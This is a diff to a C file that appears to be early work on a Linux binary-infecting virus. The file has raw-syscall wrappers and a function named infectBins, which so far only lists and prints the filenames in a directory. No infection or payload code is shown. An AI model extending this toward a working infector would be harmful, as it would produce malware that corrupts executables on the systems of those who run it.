@@ -1,20 +1,19 @@
-#define _FCNTL_H
+#include <fcntl.h>
 #include <linux/stat.h>
 #include <stddef.h>
 #include <sys/types.h>
-#include <bits/fcntl.h>
 #include <bits/stat.h>
 #include <stdio.h>
 #include <signal.h>
+#include <dirent.h>
 
 typedef off_t off64_t;
 typedef ino_t ino64_t;
 
-struct  linux_dirent64 {
-  ino64_t         d_ino;
-  off64_t         d_off;
+struct  linux_dirent {
+  unsigned long         d_ino;
+  unsigned long         d_off;
   unsigned short  d_reclen;
-  unsigned char   d_type;
   char            d_name[];
 };
 
@@ -29,16 +28,17 @@ static int  write(int fd, const void *buf, size_t count) {
   return (rax);
 }
 
-static int  open(const char *pathname, int flags, int mode) {
-  register int8_t     rax asm("rax") = 2;
-  register const char *rdi asm("rdi") = pathname;
-  register int        rsi asm("rsi") = flags;
-  register int        rdx asm("rdx") = mode;
 
-  asm("syscall"
-    : "=r" (rax));
-  return (rax);
-}
+/* static int  open(const char *pathname, int flags, int mode) { */
+/*   register int8_t     rax asm("rax") = 2; */
+/*   register const char *rdi asm("rdi") = pathname; */
+/*   register int        rsi asm("rsi") = flags; */
+/*   register int        rdx asm("rdx") = mode; */
+
+/*   asm("syscall" */
+/*     : "=r" (rax)); */
+/*   return (rax); */
+/* } */
 
 static int  close(int fd) {
   register int8_t       rax asm("rax") = 3;
@@ -83,10 +83,10 @@ static int  munmap(void *addr, size_t len) {
   return (rax);
 }
 
-static int  getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
-  register int8_t                 rax asm("rax") = 217;
+static int  getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+  register int8_t                 rax asm("rax") = 78;
   register unsigned int           rdi asm("rdi") = fd;
-  register struct linux_dirent64  *rsi asm("rsi") = dirp;
+  register struct linux_dirent  *rsi asm("rsi") = dirp;
   register unsigned int           rdx asm("rdx") = count;
 
   asm("syscall"
@@ -173,15 +173,26 @@ static void  *memmove(void *dest, const void *src, size_t n) {
 /* } */
 
 static int  infectBins(const char *dirname) {
+  int                   nread;
   int                   fd;
-  struct linux_dirent64 dirp;
+  struct linux_dirent *dirp;
+  char  yo[1024];
+  char  d_type;
   /* struct dirent *file; */
 
   if ((fd = open(dirname, O_RDONLY | O_DIRECTORY, 0)) < 0)
     return (-1);
   dprintf(1, "Dirname: %s, Fd: %i\n", dirname, fd);
-  dprintf(1, "Return value: %i\n", getdents64(fd, &dirp, sizeof(dirp)));
-  dprintf(1, "Filename: \"%s\"\n", dirp.d_name);
+  nread = getdents(fd, (struct linux_dirent *)yo, 1024);
+  dprintf(1, "Nread: %i\n", nread);
+  int bpos;
+
+  bpos = 0;
+  while (bpos < nread) {
+    dirp = (struct linux_dirent *) (yo + bpos);
+    dprintf(1, "Filename: %s\n", dirp->d_name);
+    bpos += dirp->d_reclen;
+  }
   /* if ((dir = opendir(dirname)) == NULL) */
   /*   return (-1); */
   /* while ((file = readdir(dir)) != NULL) { */
